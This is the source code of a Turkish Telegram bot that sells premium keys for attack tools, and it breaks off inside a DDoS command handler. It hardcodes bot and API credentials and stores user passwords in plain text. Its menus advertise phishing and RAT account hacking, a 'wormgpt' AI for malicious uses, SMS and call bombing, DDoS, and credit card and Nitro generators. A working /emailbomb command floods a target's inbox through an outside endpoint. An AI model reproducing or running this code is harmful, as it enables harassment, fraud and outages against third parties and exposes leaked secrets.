import concurrent.futures
import json
import os
import socket
import random
import requests
import string
import time
import urllib
import urllib3
import gzip
import re
import uuid
import subprocess
import datetime
import sys
import telebot
from telebot import types
from subprocess import DEVNULL, PIPE, Popen, STDOUT
from datetime import datetime
import threading
from bs4 import BeautifulSoup
from re import search, compile
from configparser import ConfigParser
import logging
import marshal
import zlib
import base64
import qrcode
from urllib.parse import urlparse, parse_qs
import youtube_dl
import tempfile
import platform
import yt_dlp
import hashlib
from zxcvbn import zxcvbn
from tempfile import NamedTemporaryFile
from io import BytesIO
from pyshorteners import Shortener
from datetime import datetime, timedelta
from PIL import Image, ImageDraw, ImageFont
from itertools import product
from functools import wraps
from threading import Thread, active_count
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from requests import post
from marshal import dumps, loads
from pickle import dumps, loads
from zlib import compress, decompress
from base64 import b16encode, b16decode, b32encode, b32decode, b64encode, b64decode, b85encode, b85decode
from random import choice
import codecs
import fake_useragent
from os import name, stat, system
from os.path import isfile
from sys import exit
from time import ctime, sleep
from zlib import compress
from rich.console import Console
from rich.panel import Panel
from fake_useragent import UserAgent
ua = UserAgent()
rastgele_user_agent = ua.random

TELEGRAM_TOKEN = '6649599069:AAFeoVSNrzOxfRs1ZgLU1rbLpEqJElZNkSo'
EXCHANGE_API_KEY = 'ed0b1dd31871fc9b7cfbaf94'
CHANNEL_ID_1 = '@TeknoDroidEvreni'
CHANNEL_ID_2 = '@CVARB_AI'
ADMIN_ID = 6376070018
TELEGRAM_ID = '6376070018'


GOOGLE_CUSTOM_SEARCH_URL = "https://www.googleapis.com/customsearch/v1"

API_KEY = "AIzaSyC4pac0gU1cvOKf8HHZjpBNy8xqfx8iKFI"

SEARCH_ENGINE_ID = "92ae0d76e3289442e"

WEATHER_API_KEY = "4176d3bfc0cfdc7bce50aae0b6fa2559"


bot = telebot.TeleBot(TELEGRAM_TOKEN)
user_data = {}

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

def send_join_channel_message(message):
    keyboard = types.InlineKeyboardMarkup()
    url_button1 = types.InlineKeyboardButton("1. KANAL", url=f'https://t.me/{CHANNEL_ID_1.strip("@")}')
    url_button2 = types.InlineKeyboardButton("2. KANAL", url=f'https://t.me/{CHANNEL_ID_2.strip("@")}')
    keyboard.add(url_button1, url_button2)
    bot.send_message(message.chat.id, 'Merhaba Dostum, Botu Kullanmaya Başlamadan Önce Lütfen Aşağıdaki Kanallara Katıl. Katıldıktan Sonra /start Komutunu Göndererek Botu Kullanmaya Başlayabilirsin.', reply_markup=keyboard)

def check_membership(f):
    @wraps(f)
    def decorated_function(message):
        user_id = message.from_user.id
        try:
            member_status_1 = bot.get_chat_member(CHANNEL_ID_1, user_id).status
            member_status_2 = bot.get_chat_member(CHANNEL_ID_2, user_id).status
            if member_status_1 in ['left', 'kicked'] or member_status_2 in ['left', 'kicked']:
                send_join_channel_message(message)
                return
        except Exception as e:
            bot.send_message(message.chat.id, 'Bir hata oluştu: ' + str(e))
            return
        return f(message)
    return decorated_function
    
def safe_execute(func):
    """
    Fonksiyonları güvenli bir şekilde çalıştırmak için bir dekoratör.
    Herhangi bir hata oluşursa, kullanıcıya genel bir hata mesajı gösterir.
    """
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            message = args[0]  # message parametresi her fonksiyonun ilk argümanıdır
            bot.reply_to(message, "Üzgünüm, bir hata oluştu. Lütfen daha sonra tekrar deneyin.")
            return  # Hata durumunda orijinal fonksiyonun devam etmemesi için
    return wrapper

    
def user_is_logged_in(func):
    @wraps(func)
    def decorated_function(message, *args, **kwargs):
        user_id = str(message.from_user.id)
        if user_data.get(user_id) != True:
            bot.reply_to(message, "Dostum Komutları Kullanabilmen İçin Giriş Yapman Lazım, Lütfen Önce Giriş Yap!\n/giris_yap")
            return
        return func(message, *args, **kwargs)
    return decorated_function

def user_is_premium(func):
    @wraps(func)
    def decorated_function(message, *args, **kwargs):
        user_id = str(message.from_user.id)
        if not has_key(user_id):
            bot.reply_to(message, "Premium özellikleri kullanabilmek için bir KEY'e ihtiyacın var. KEY almak için @Tekn0Droid ile iletişime geç.")
            return
        return func(message, *args, **kwargs)
    return decorated_function
    
    
def sadece_admin(f):
    def wrapper(message):
        if message.from_user.id == ADMIN_ID:
            return f(message)
        else:
            bot.send_message(message.chat.id, "Bu komutu kullanma yetkiniz yok.")
    return wrapper   
    
# Engellenen kullanıcıların listesi
banned_users = []

# Keyleri okuma fonksiyonu
def read_keys():
    try:
        with open('key.txt', 'r') as file:
            keys = file.readlines()
        return keys
    except FileNotFoundError:
        return []
        
def write_keys(keys):
    try:
        with open('key.txt', 'w') as file:
            for key in keys:
                file.write(key)
    except Exception as e:
        # Hata mesajı çıktısı kaldırıldı.
        pass        

def has_key(user_id):
    # Normal keyleri kontrol et
    keys = read_keys()
    user_id_str = str(user_id)
    for key in keys:
        stored_user_id, rest = key.strip().split(':', 1)
        if stored_user_id == user_id_str:
            stored_key, expiration_date, _ = rest.split()
            expiration_date = datetime.strptime(expiration_date, '%Y-%m-%d')
            if datetime.now() <= expiration_date:
                return True
            else:
                return False  # Key var ama süresi dolmuş
    
    # Deneme keylerini kontrol et
    demo_keys = read_demo_keys()
    for key in demo_keys:
        stored_user_id, _, expiration_date, status = key.split(':')
        if stored_user_id == user_id_str:
            if datetime.now() <= datetime.strptime(expiration_date, '%Y-%m-%d') and status == 'aktif':
                return True
            else:
                return False  # Key var ama süresi dolmuş ya da pasif

def set_user_logged_in(user_id, logged_in=True):
    user_data[user_id] = logged_in


@bot.message_handler(commands=['admin'])
@sadece_admin
def admin_panel(message):
    if message.from_user.id == ADMIN_ID:
        commands_list = """Admin Komutları:
- /key_ekle <kullanıcı_id> <ay_sayısı> - Yeni bir key ekler. Kullanımı: /key_ekle 123456789 3
- /key_sil <kullanıcı_id> - Bir keyi siler. Kullanımı: /key_sil 123456789
- /duyuru_yap <mesaj> - Tüm kullanıcılara duyuru yapmak için. Kullanımı: /duyuru_yap Merhaba, yeni özelliklerimiz var!
- /kullanici_engelle <kullanıcı_id> - Bir kullanıcıyı engeller. Kullanımı: /kullanici_engelle 123456789
- /kullanici_uyar <kullanıcı_id> <mesaj> - Bir kullanıcıyı uyarır. Kullanımı: /kullanici_uyar 123456789 Lütfen kurallara uyalım.
- /engel_kaldir <kullanıcı_id> - Bir kullanıcının engelini kaldırır. Kullanımı: /engel_kaldir 123456789"""
        bot.send_message(message.chat.id, commands_list)
    else:
        bot.send_message(message.chat.id, "Bu komutu kullanma yetkiniz yok.")
        
# Duyuru Yapma
@bot.message_handler(commands=['duyuru_yap'])
@sadece_admin
def duyuru_yap(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Bu komutu kullanma yetkiniz yok.")
        return
    
    # Mesajın içeriğini kontrol et
    duyuru_mesaji = message.text.replace("/duyuru_yap ", "", 1)
    if not duyuru_mesaji:
        bot.reply_to(message, "Lütfen duyuru mesajınızı girin. Örnek: /duyuru_yap Merhaba, yeni bir güncelleme var!")
        return

    with open("kullanicilar.txt", "r") as file:
        for line in file:
            # Engellenmiş kullanıcıları atla
            if "x" in line:
                continue
            user_id = line.split(")")[1].split(":")[0].strip()
            try:
                bot.send_message(user_id, duyuru_mesaji)
            except Exception as e:
                # Kullanıcıya mesaj gönderme işlemi sırasında bir hata meydana geldiğinde,
                # burada bir işlem yapmayarak hata mesajının görünmesini engelliyoruz.
                pass
                
@bot.message_handler(commands=['kullanici_engelle'])
@sadece_admin
def kullanici_engelle(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Bu komutu kullanma yetkiniz yok.")
        return
    
    try:
        user_id_to_ban = message.text.split()[1]
        updated_lines = []
        with open("kullanicilar.txt", "r") as file:
            for line in file:
                if user_id_to_ban in line:
                    updated_lines.append(line.strip() + " x\n")
                else:
                    updated_lines.append(line)
        with open("kullanicilar.txt", "w") as file:
            file.writelines(updated_lines)
        bot.reply_to(message, f"{user_id_to_ban} başarıyla engellendi.")
    except Exception as e:
        bot.reply_to(message, f"Bir hata oluştu: {e}")
        
@bot.message_handler(commands=['engel_kaldir'])
@sadece_admin
def command_unban_user(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            if unban_user(user_id):
                bot.send_message(message.chat.id, f"{user_id} ID'li kullanıcının engeli kaldırıldı.")
            else:
                bot.send_message(message.chat.id, "Bu kullanıcı bulunamadı veya zaten engelli değil.")
        except IndexError:
            bot.send_message(message.chat.id, "Lütfen bir kullanıcı ID'si girin. Örnek kullanım: /engel_kaldir 123")
        except ValueError:
            bot.send_message(message.chat.id, "Lütfen geçerli bir kullanıcı ID'si girin.")
    else:
        bot.send_message(message.chat.id, "Bu komutu kullanma yetkiniz yok.")

def unban_user(user_id):
    updated = False
    with open("kullanicilar.txt", "r") as file:
        lines = file.readlines()
    with open("kullanicilar.txt", "w") as file:
        for line in lines:
            line_content, _, banned_marker = line.partition(" x")
            if str(user_id) in line_content and banned_marker:
                file.write(f"{line_content}\n")
                updated = True
            else:
                file.write(line)
    return updated

# Kullanıcı Uyarı
@bot.message_handler(commands=['kullanici_uyar'])
@sadece_admin
def kullanici_uyar(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Bu komutu kullanma yetkiniz yok.")
        return

    try:
        user_id, warning_message = message.text.split(maxsplit=1)[1].split(maxsplit=1)
    except ValueError:
        bot.reply_to(message, "Kullanım: /kullanici_uyar <kullanıcı_id> <mesaj>")
        return

    try:
        bot.send_message(user_id, f"Admin tarafından bir uyarı aldınız: {warning_message}")
        bot.reply_to(message, f"{user_id} ID'li kullanıcıya uyarı mesajı gönderildi.")
    except Exception as e:
        bot.reply_to(message, f"Uyarı mesajı gönderilemedi: {e}")


@bot.message_handler(commands=['key_ekle'])
@sadece_admin
def handle_add_key(message):
    try:
        _, user_id, months = message.text.split()
        user_id = int(user_id)
        months = int(months)

        new_key = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))
        expiration_date = (datetime.now() + timedelta(days=30*months)).strftime('%Y-%m-%d')
        keys = read_keys()
        keys.append(f'{user_id}:{new_key} {expiration_date} {months}\n')
        write_keys(keys)
        bot.send_message(message.chat.id, f'Key {new_key} kullanıcı {user_id} için eklendi ve {months} ay sonra süresi dolacak.')
    except ValueError:
        bot.send_message(message.chat.id, "Hatalı komut formatı. Lütfen /key_ekle <id> <ay> formatını kullanın.")

@bot.message_handler(commands=['key_sil'])
@sadece_admin
def handle_remove_key(message):
    try:
        _, user_id = message.text.split()
        user_id = int(user_id)
    except ValueError:
        bot.send_message(message.chat.id, "Hatalı komut formatı. Lütfen /key_sil <id> formatını kullanın.")
        return

    keys = read_keys()
    key_found = False
    new_keys = []
    for key in keys:
        if key.startswith(f'{user_id}:'):
            key_found = True
        else:
            new_keys.append(key)
    
    if key_found:
        write_keys(new_keys)
        bot.send_message(message.chat.id, f'Kullanıcı {user_id} için key başarıyla silindi.')
    else:
        bot.send_message(message.chat.id, "Bu ID'ye ait bir kullanıcı dosyada bulunamadı.")
    
# Deneme key'i eklemek için fonksiyon
def add_demo_key(user_id):
    existing_keys = read_demo_keys()
    if any(key.startswith(str(user_id)) for key in existing_keys):
        # Kullanıcı daha önce key almış
        return False
    else:
        # Yeni key üret ve kaydet
        new_key = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))
        expiration_date = (datetime.now() + timedelta(days=30)).strftime('%Y-%m-%d')
        with open('deneme_keyleri.txt', 'a') as file:
            file.write(f"{user_id}:{new_key}:{expiration_date}:aktif\n")
        return new_key, expiration_date

# Deneme key'lerini okumak için fonksiyon
def read_demo_keys():
    try:
        with open('deneme_keyleri.txt', 'r') as file:
            keys = file.readlines()
        return [key.strip() for key in keys]
    except FileNotFoundError:
        return []

# Kullanıcının deneme key'ini kontrol etmek için fonksiyon
def check_demo_key_status(user_id):
    keys = read_demo_keys()
    for key in keys:
        stored_user_id, _, expiration_date, status = key.split(':')
        if stored_user_id == str(user_id):
            if datetime.now() > datetime.strptime(expiration_date, '%Y-%m-%d'):
                return "pasif"
            return status
    return "yok"

# /deneme_keyi_al komutunu işleyecek fonksiyon
@bot.message_handler(commands=['deneme_keyi_al'])
@safe_execute
@check_membership
def handle_demo_key_request(message):
    user_id = message.from_user.id
    status = check_demo_key_status(user_id)
    if status == "yok":
        key_info = add_demo_key(user_id)
        if key_info:
            new_key, expiration_date = key_info
            bot.reply_to(message, f"Deneme key'iniz: {new_key}. Bu key {expiration_date} tarihine kadar geçerlidir.\n\nBir Ay Boyunca Bu Key İle Premium Komut Kullanabilirsin.\n/premium: Bu Komutla Premium Komutları Kullanmaya Başla 😉")
        else:
            bot.reply_to(message, "Dostum Deneme Keyini Daha Önce Almıştın Ve Bu Tek Kullanımlık Bir Key, Lütfen Tekrar Key İstersen Admine Yaz\n@Tekn0Droid")
    elif status == "aktif":
        bot.reply_to(message, "Zaten Aktif Bir KEY'in Var.")
    else:
        bot.reply_to(message, "Deneme KEY'inin 1 Aylık Süresi Doldu!\nUcuz Fiyata Key Almak İstersen Admine Yaz \n@Tekn0Droid")
    
@bot.message_handler(commands=['keysiz_giris'])
@safe_execute
@check_membership
def keysiz_giris_handler(message):
    ask_for_username_keysiz(message)  
    
@bot.message_handler(commands=['kayit_ol'])
@safe_execute
def register(message):
    ask_for_username(message)        
    
@bot.message_handler(commands=['keyli_giris'])
@safe_execute
@check_membership
def keyli_giris_handler(message):
    ask_for_key(message)

def check_credentials(username, password):
    with open("kayitol.txt", "r") as file:
        for line in file:
            usr, pwd = line.strip().split(";")
            if usr == username and pwd == password:
                return True
    return False

def check_key(input_key):
    with open("key.txt", "r") as file:
        for line in file:
            _, stored_key = line.strip().split(':')
            if stored_key == input_key:
                return True
    return False


def process_login_type(message):
    if message.text == '/keyli_giris':
        ask_for_key(message)
    elif message.text == '/keysiz_giris':
        ask_for_username_keysiz(message)

def ask_for_key(message):
    user_id = message.chat.id
    if has_key(user_id):
        # Kullanıcı daha önce bir anahtar almış
        msg = bot.reply_to(message, "Selam Dostum, Görünüşe Göre Adminden Daha Önce Bir KEY Almışsın 👍.\n\nLütfen Adminden Aldığın KEY'i Gir Ve Premium Komutları Kullanmaya Başla")
    else:
        # Kullanıcı daha önce anahtar almamış
        msg = bot.reply_to(message, "Şuan Senin Bir KEY'in Yok, Ucuz Fiyata Almak İçin @Tekn0Droid e Yazabilirsin 😉")
    bot.register_next_step_handler(msg, process_key_login)

def check_key_for_user(user_id, input_key):
    # Öncelikle normal keyler kontrol edilir.
    keys = read_keys()
    for key_line in keys:
        key_info = key_line.strip().split(":")
        if len(key_info) != 2:
            continue
        stored_user_id, rest = key_info
        if stored_user_id == str(user_id):
            stored_key, expiration_date, _ = rest.split()
            if stored_key == input_key:
                expiration_date = datetime.strptime(expiration_date, '%Y-%m-%d')
                if datetime.now() <= expiration_date:
                    return True  # Key geçerli
                else:
                    return False  # Key var ama süresi dolmuş

    # Normal key bulunamazsa, deneme keyleri kontrol edilir.
    demo_keys = read_demo_keys()
    for key in demo_keys:
        stored_user_id, stored_key, expiration_date, status = key.split(':')
        if stored_user_id == str(user_id) and stored_key == input_key:
            expiration_date = datetime.strptime(expiration_date, '%Y-%m-%d')
            if datetime.now() <= expiration_date and status == "aktif":
                return True  # Deneme key geçerli
            else:
                return False  # Deneme key süresi dolmuş veya pasif

    return False  # Hiçbir geçerli key bulunamadı

def process_key_login(message):
    user_id = message.chat.id
    input_key = message.text.strip()
    if check_key_for_user(user_id, input_key):
        set_user_logged_in(str(user_id), True)  # Set the user as logged-in
        bot.reply_to(message, "Girdiğin KEY doğru ve geçerli, artık premium özelliklere sahipsin.😉\n\nPremium özellikleri görmek için \n/premium yaz.")
    else:
        bot.reply_to(message, "Bu KEY ya geçersiz, süresi dolmuş ya da başka bir kullanıcıya ait. Lütfen doğru KEY'ini kullan.")

    
def ask_for_username(message):
    msg = bot.reply_to(message, "Kayıt olmak için bir kullanıcı adı girin:")
    bot.register_next_step_handler(msg, process_register_username_step)

def process_register_username_step(message):
    user_data['username'] = message.text  # Kullanıcı adını kaydet
    msg = bot.reply_to(message, "Şimdi bir şifre girin:")
    bot.register_next_step_handler(msg, process_register_password_step, user_data)

def process_register_password_step(message, user_data):
    with open("kayitol.txt", "a") as file:
        file.write(f"{user_data['username']};{message.text}\n")  # Kullanıcı adı ve şifre kaydedilir
    bot.reply_to(message, "Başarıyla Kayıt Oldunuz! Şimdi /keysiz_giris Komutuyla Giriş Yapabilirsiniz.")        

def ask_for_username_keysiz(message):
    msg = bot.reply_to(message, "Giriş Yapmak İçin Kullanıcı Adını Gir:")
    bot.register_next_step_handler(msg, process_login_username_step)

def process_login_username_step(message):
    user_data = {'username': message.text}
    msg = bot.reply_to(message, "Şifreni Gir:")
    bot.register_next_step_handler(msg, process_login_password_step, user_data)

def process_login_password_step(message, user_data):
    if check_credentials(user_data['username'], message.text):
        bot.reply_to(message, "Girişin Başarılı! Şimdi /komutlar Komutu İle Free Komutları Kullanabilirsin.")
        set_user_logged_in(str(message.from_user.id), True)  # Kullanıcı giriş yaptı olarak işaretlenir
    else:
        bot.reply_to(message, "Girdiğin Kullanıcı Adın Veya Şifre Hatalı, Eğer Şifreni Unuttuysan Tekrar Bedavaya Kayıt Olabilirsin.\nKayıt Olma Komutu; /kayit_ol\n\nEğer Tekrar Denemek İstiyorsan \n/keysiz_giris Komutunu Tekrar Kullan.")

def user_already_saved(user_id):
    try:
        with open("kullanicilar.txt", "r") as file:
            for line in file:
                line = line.strip()  # Satırın başındaki ve sonundaki boşlukları temizle
                if not line:  # Boş satırları atla
                    continue
                try:
                    saved_user_id, _ = line.split(":", 1)  # ":" karakterine göre böl ve en fazla 2 parça elde et
                    # Parantez içindeki numarayı ve ID'yi ayırmak için ek kontrol
                    _, saved_user_id = saved_user_id.split(")", 1)
                except ValueError:
                    # Satır beklenen formatta değilse, döngüye devam et
                    continue
                if saved_user_id.strip() == str(user_id).strip():
                    return True
    except FileNotFoundError:
        # Dosya henüz oluşturulmadıysa, kullanıcı kaydedilmedi demektir.
        return False
    return False

def get_next_user_number():
    try:
        with open("kullanicilar.txt", "r") as file:
            lines = file.readlines()
            if not lines:  # Dosya boş ise
                return 1
            last_line = lines[-1]
            last_number, _ = last_line.split(")", 1)
            return int(last_number.strip()) + 1  # Son kullanıcı numarasını dön
    except FileNotFoundError:
        return 1

def save_user_start(user_id):
    if not user_already_saved(user_id):
        user_number = get_next_user_number()
        with open("kullanicilar.txt", "a") as file:
            start_date = datetime.now().strftime("%Y-%m-%d")
            file.write(f"{user_number}) {user_id}:{start_date}\n")  # Kullanıcıyı kaydet


@bot.message_handler(commands=['start', 'kayit_ol', 'giris_yap'])
@safe_execute
@check_membership
def send_welcome(message):
    user_id = str(message.from_user.id)
    # Kullanıcı engelli mi diye kontrol et
    is_banned = check_if_banned(user_id)
    if is_banned:
        bot.reply_to(message, "Yanlış Bir Hareketinden Dolayı Admin Tarafından Engellendin Artık Botu Kullanamazsın :(\nAdmin; @Tekn0Droid")
        return
    
    save_user_start(user_id)  
    user_first_name = message.from_user.first_name
    username = message.from_user.username
    name_to_use = f"@{username}" if username else user_first_name
    
    if message.text == '/kayit_ol':
        ask_for_username(message)
    elif message.text == '/giris_yap':
        ask_login_type(message)
    else:
	       
        bot.reply_to(message, f"🤖 Merhaba {name_to_use}, ben CVARB, @Tekn0Droid tarafından yaratıldım. Sınırsız özelliklerimle tanışmaya hazır ol! 🔥\n\n✔️ Bizi tercih ettiğin için teşekkürler! Herhangi bir sorun yaşarsan, lütfen iletişim bölümümüzden bize ulaş.\n\nGiriş Yapmak İçin:\n/giris_yap\n\nKayıt Olmak İçin:\n/kayit_ol\n\nKanallarımız İçin:\n/kanal 📢\n\nİletişim İçin:\n/iletisim 📞\n\nÜcretli KEY Almak İçin:\n/key_al 🔑\n\nBedava 1 Haftalık KEY Almak İçin:\n/deneme_keyi_al 🚀")

def check_if_banned(user_id):
    with open("kullanicilar.txt", "r") as file:
        for line in file:
            if user_id in line and "x" in line:
                return True
    return False
        
@bot.message_handler(commands=['kanal'])
@safe_execute
@check_membership
def kanal(message):
    kanal_mesaji = "👤 • KANALIMIZ; @TeknoDroidEvreni\n\n👥 • KANALLARIMIZ; @TeknoDroidBio\n\n📢 • GELİŞTİRME KANALIMIZ;\n@CVARB_AI"
    bot.send_message(message.chat.id, kanal_mesaji)

@bot.message_handler(commands=['iletisim'])
@safe_execute
@check_membership
def iletisim(message):
    msg = bot.send_message(message.chat.id, "Admine Göndermek İstediğin Mesajı Yaz:")
    bot.register_next_step_handler(msg, process_contact_message)

def process_contact_message(message):
    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    bot.send_message(message.chat.id, "Mesajın Admine İletildi. Teşekkürler!")        
   
def ask_login_type(message):
    markup = types.ReplyKeyboardRemove()  # Bu satır, kullanıcıya özel klavyeyi kaldırır.
    msg = bot.send_message(message.chat.id, "Eğer TeknoDroid'den KEY Aldıysan \n/keyli_giris Komutu İle Premium Girişi Yap, Ama Eğer Botta Herhangi Bir Üyeliğin Yoksa /keysiz_giris Komutu İle Kayıt Olup Giriş Yap Ve Free Özelliklerle Botu Kullan", reply_markup=markup)

@bot.message_handler(commands=['komutlar'])
@safe_execute
@check_membership
@user_is_logged_in

def freemium_features(message):
    username = message.from_user.username
    name_to_use = f"@{username}" if username else message.from_user.first_name
    # Free özelliklerin listesini buraya ekleyin
    free_features = """
╭━━━━━━━━━━━━━╮
┃➣ PREMİUM
┃━━━━━━━━━━━━━━
┃➥ 🌟 /premium - Premium Kullanıcılara Özel Ve Olağan Üstü Komutlar.
╰━━━━━━━━━━━━━━━━━━━━━━━    
    
        < < <  FREE KOMUTLAR  > > >
        
╭━━━━━━━━━━━━━╮
┃➣ OLUŞTURULAR
┃━━━━━━━━━━━━━━
┃➥ 🎨 /logo - Kendi ismine özel sınırsız logo yap.
┃➥ 🔳 /qr - Kendine özel QR kodlar üret.
┃➥ ✍️ /deftereyaz - İsmini deftere yaz.
┃➥ 🎁 /playkod - Sınırsız random Play kod üret.
┃➥ 💳 /cc - Kendine sınırsız CC üret.
┃➥ *️⃣ /numara_al - Kendine sınırsız numara üret.
┃➥ 🌪️ /discord_nitro - Kendine Sınırsız Discord Nitro Üret.
┃➥ ✳️ /duvar_kagidi - Kendine Sınırsız Duvar Kağıdı Üret.
╰━━━━━━━━━━━━━━━━━━━━━━━

╭━━━━━━━━━━━━━╮
┃➣ BİLGİ
┃━━━━━━━━━━━━━━
┃➥ 🆔 /myid - ID'ni öğren.
┃➥ 🪝 /index - İstediğin sitenin index'ini çek.
┃➥ 🪶 /ip - IP adresini öğren.
┃➥ 🌥️ /hava_durumu - İstediğin Bölgenin Hava Durumunu Öğren.
╰━━━━━━━━━━━━━━━━━━━━━━━

╭━━━━━━━━━━━━━╮
┃➣ PARA
┃━━━━━━━━━━━━━━
┃➥ 💸 /dovizhesapla - Dolar ve Euronun kaç TL olduğunu güncel öğrenebilirsin.
╰━━━━━━━━━━━━━━━━━━━━━━━

╭━━━━━━━━━━━━━╮
┃➣ TOOL
┃━━━━━━━━━━━━━━
┃➥ 🌐 /ceviri - İstediğin cümleyi istediğin dile çevir.
┃➥ 🔠 /yazitipi - Metnini ya da isminin yazı tipini, şeklini veya biçimini değiştir.
┃➥ 🪶 /premium_apk - İstediğin Modlu Apk'yı Anında Bul.
┃➥ 🔗 /link_kisalt - İstediğin linki kolayca kısaltabilirsin.
┃➥ 🧷 /tool - Çok Daha Fazla Tool.
╰━━━━━━━━━━━━━━━━━━━━━━━

╭━━━━━━━━━━━━━╮
┃➣ EĞLENCE
┃━━━━━━━━━━━━━━
┃➥ 🎮 /oyun - Hadi biraz oyun oynayalım.
┃➥ 💅 /guzellik_olc - Bir fotoğraf gönder, 100 üzerinden puan vereyim.
╰━━━━━━━━━━━━━━━━━━━━━━━

╭━━━━━━━━━━━━━╮
┃➣ GÜVENLİK
┃━━━━━━━━━━━━━━
┃➥ 🔍 /sitekontrol - Siteye girmeden önce SS'ini al.
┃➥ 🔐 /sifre_guvenligi - Şifrenin ne kadar güvenli olduğunu gör.
╰━━━━━━━━━━━━━━━━━━━━━━━

╭━━━━━━━━━━━━━╮
┃➣ VİDEO İNDİRİCİ
┃━━━━━━━━━━━━━━
┃➥ 🎥 /twitter_video_indir - Twitter Videolarını Kolayca İndirir
┃➥ 📹 /threads_video_indir - Threads Videolarını Kolayca İndirir
┃➥ 📽️ /fb_video_indir - Facebook Videolarını Kolayca İndirir
┃➥ 📼 /tiktok_video_indir - TikTok Videolarını Kolayca İndirir
┃➥ 🎦 /insta_video_indir - Instagram Videolarını Kolayca İndirir
┃➥ 📺 /yt_video_indir - YouTube Videolarını Kolayca İndirir
╰━━━━━━━━━━━━━━━━━━━━━━━"""

    bot.reply_to(message, f"{free_features}")

@bot.message_handler(commands=['premium'])
@safe_execute
@check_membership
@user_is_logged_in
@user_is_premium
def premium_features(message):
    user_id = message.chat.id
    if has_key(user_id):

        premium_features = """
╭━━━━━━━━━━━━━╮
┃🌟 PREMIUM KOMUTLAR 🌟
┃━━━━━━━━━━━━━━━
┃➥ 📿 /phisher - Link (RAT) İle Hesap Hackle
┃➥ 👹 /wormgpt - Etik Olmayan Ve Kötü Amaçlar İçin Yapay Zeka
┃➥ 🖼️ /goruntu_olustur_ai - Yapay Zeka Görüntü Oluşuturucu
┃➥ 📧 /emailbomb - Sınırsız E-Mail Spamlama-Bombalama
┃➥ 💣 /smsbomb - Sınırsız Anonim SMS Bombası
┃➥ 📞 /aramabomb - Sınırsız Anonim Arama Bombası
┃➥ 👻 /postview - Telegram Mesajinın Görüntülemesini Arttır
┃➥ 💰 /ticaret_egitimi - Muhtesem Nitelikte Para Ve Ticaret Eğitimleri
┃➥ ☠️ /ddos - Sitelere Ağır DDOS'lar Atarak Çökert
┃➥ ⚡ /ilkyazan - Her Kanalda İlk Yazanlarda Hile Yap
┃➥ 🎀 /fakeno_al - İstediğin Kadar Sınırsız Ve Bedava Fake No Al (Beta) 
╰━━━━━━━━━━━━━━━━━━━━━━━"""

        bot.send_message(user_id, premium_features)

    else:
        bot.reply_to(message, "Maalesef senin bir KEY'in yok ve bu yüzden premium özellikleri kullanamazsın. Eğer premium komutları kullanmak istiyorsan @Tekn0Droid'den bir KEY al ve premium hesaba geç.\nŞu an kullanabileceklerin: /komutlar")
        
@bot.message_handler(commands=['emailbomb'])
@safe_execute
@check_membership
@user_is_logged_in
@user_is_premium
def email_bomb_command(message):
    try:
        params = message.text.split()
        if len(params) < 3:  # Parametre kontrolü
            bot.reply_to(message, "Bu Komut İle İstediğin E Postaya Sınırsız Spam Atabilirsin.\nÖrnek Kullanım;\n/emailbomb example@gmail.com 10\nBu Komut Girilen E Postaya 10 Spam Maili Atar.")
            return
        
        email = params[1]
        istenen_sayi = int(params[2])
        gercek_sayi = istenen_sayi * 2  # Kullanıcıdan alınan sayının 2 katı
        
        basarili = 0
        basarisiz = 0
        start_time = time.time()
        
        # Kullanıcıya işlem başladı bilgisi gönder
        process_message = bot.reply_to(message, f"GİRİLEN E-MAİL'E SON HIZDA {istenen_sayi} TANE SPAM ATILIYOR 😈\n\nLütfen Bekle Sana Bilgileri Vericem...")
        
        for i in range(gercek_sayi):
            # API çağrısı simülasyonu
            api = requests.post('https://api6-fc532dd97232.herokuapp.com/', data={'email': email, 'submit': ''}).text
            if "OTP SENT" in api:
                basarili += 1
            else:
                basarisiz += 1
            time.sleep(0.5)  # API çağrısı varsayılan bekleme süresi

        end_time = time.time()
        spam_suresi = end_time - start_time
        
        # İşlem sonuç mesajı ile temp mesajı güncelle
        bot.edit_message_text(chat_id=message.chat.id, message_id=process_message.message_id, text=f"Bu E-Mail'e;\n{email} {istenen_sayi} Tane Spam Gönderimi Tamamlandı!\n\n{istenen_sayi} Spam, \n{spam_suresi:.2f} saniye içerisinde gönderildi. \n\nGönderilen Spam'lar;\n{basarili//2} başarılı, {basarisiz//2} başarısız.")
    except Exception as e:
        bot.reply_to(message, "Bir hata oluştu: " + str(e))        
        
@bot.message_handler(commands=['fakeno_al'])
@safe_execute
@check_membership
@user_is_logged_in
@user_is_premium
def send_fake_welcome(message):
    markup = types.InlineKeyboardMarkup()
    for num, info in secenekler.items():
        ulke = list(info.keys())[0]
        numara = info[ulke]
        markup.add(types.InlineKeyboardButton(text=f"{ulke}: {numara}", callback_data=str(num)))
    bot.send_message(message.chat.id, "Bir Numara Seç:", reply_markup=markup)        
        
@bot.message_handler(commands=['ilkyazan'])
@safe_execute
@check_membership
@user_is_logged_in
@user_is_premium
def ilk_yazan_baslat_komutu(mesaj):
    bot.send_message(mesaj.chat.id, "Bu Komut İle Katıldığın Kanalların Tümünde İlk Yazan Yapıldığında Her Zaman İlk Yazan Yorumunu Sen Yapıcaksın.\n\nKULLANIM;\nÖnce my.telegram.org Sitesine Giriş Yap, Ardından APİ İD Ve APİ HASH Bilgilerini Kopyala Daha Sonra /ilk_yazan Komutunu Kullan Ve Kopyaladığın Bilgileri Sırayla Gir Ama Eğer Hesabında 2 Adımlı Doğrulama Varsa Hata Alırsın, Sana Önerim Fake Hesabindan İslem Yapman.")        
        
@bot.message_handler(commands=['ddos'])
@safe_execute
@check_membership
@user_is_logged_in
@user_is_premium
def handle_ddos_command(message):
    try:
        # Komuttan hedef siteyi ve süreyi ayıklama, portu sabit olarak 80 ayarlama
        command_parts = message.text.split()
        target = command_parts[1]
        duration = int(command_parts[2])
        port = 80  # Portu sabit olarak 80 olarak ayarla

        # Saldırıyı başlat
